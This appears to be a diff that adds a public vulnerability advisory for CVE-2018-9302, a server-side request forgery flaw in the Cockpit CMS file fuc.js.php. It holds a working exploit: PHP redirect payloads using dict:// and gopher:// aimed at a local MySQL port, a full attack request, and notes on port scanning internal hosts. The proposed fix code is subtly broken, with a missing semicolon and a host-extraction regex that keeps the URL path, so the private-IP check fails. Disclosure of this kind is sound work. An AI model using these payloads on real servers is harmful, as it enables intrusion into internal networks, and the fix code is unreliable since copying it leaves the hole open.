@@ -1,0 +1,92 @@
+# SSRF（Server Side Request Forgery） in Cockpit 0.4.4-0.5.5 (CVE-2018-9302)
+
+Cockpit CMS repairs CVE-2017-14611, but it can be bypassed, SSRF still exist, affecting the Cockpit CMS 0.4.4-0.5.5 versions.I've been tested success of "Cockpit CMS" lastest version.
+
+## Product Download: Cockpit (https://getcockpit.com)
+
+## Vulnerability Type：SSRF（Server Side Request Forgery）
+
+## Attack Type : Remote
+
+## Vulnerability Description
+
+You can edit a .php file on own server. The .php file's code example:
+
+<?php Header("Location: dict://127.0.0.1:3306/_0d%");?>
+
+## Exploit
+Request:
+
+    GET /assets/lib/fuc.js.php?url=http://myserver/redirect.php HTTP/1.1
+    Host: myserver
+    Connection: close
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8
+    referer:http://myserver/index.php
+
+
+Modify the redirect.php file on the attacker's server.example:
+    <?php Header("Location: gopher://127.0.0.1:3306/_0d%");?>
+
+If the curl function is available,then use gopher、tftp、http、https、dict、ldap、imap、pop3、smtp、telnet protocols method，if not then only use http、https、ftp protocol
+scan prot,example: <?php Header("Location: dict://127.0.0.1:3306/");?> 
+
+If the curl function is unavailable,this vulnerability trigger need allow_url_fopen option is enable in php.ini，allow_url_fopen option defualt is enable.
+
+## Versions
+
+Product: Cockpit CMS 0.4.4-0.5.5
+
+## Impact
+
+SSRF (Server Side Request Forgery) in /assets/lib/fuc.js.php in Cockpit 0.4.4 through 0.5.5 allows remote attackers to read arbitrary files or send TCP traffic to intranet hosts via the url parameter.
+
+## Fix Code
+
+The fix code example：
+
+    $url     = $_REQUEST['url'];
+    $content = null;
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+
+        header('HTTP/1.0 400 Bad Request');
+        return;
+    }
+
+    // allow only http requests
+    if (!preg_match('#^http(|s)\://#', $url)) {
+        header('HTTP/1.0 403 Forbidden');
+        return;
+    }
+    preg_match('/https*:\/\/(.+)/', $url, $matches);
+    $host= count($matches) > 1 ? $matches[1] : '';
+    $ip = gethostbyname($host);
+    //check private ip
+    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
+        return
+    }
+
+and modify the line 48 :
+
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 0);
+
+## Credit
+
+This vulnerability was discovered by Qian Wu & Bo Wang & Jiawang Zhang &  National Computer Network Emergency Response Technical Team/Coordination Center of China (CNCERT/CC)
+
+## References
+
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9302
+
+### Timeline:
+
+2018-04-03  Found Cockpit CMS vulnerability.
+
+2018-04-04  Submit vulnerability information to developers.
+
+2018-04-05  Submit CVE-ID request
+
+2018-04-28  Vendor no response, Public vulnerability information,Please Fix it.
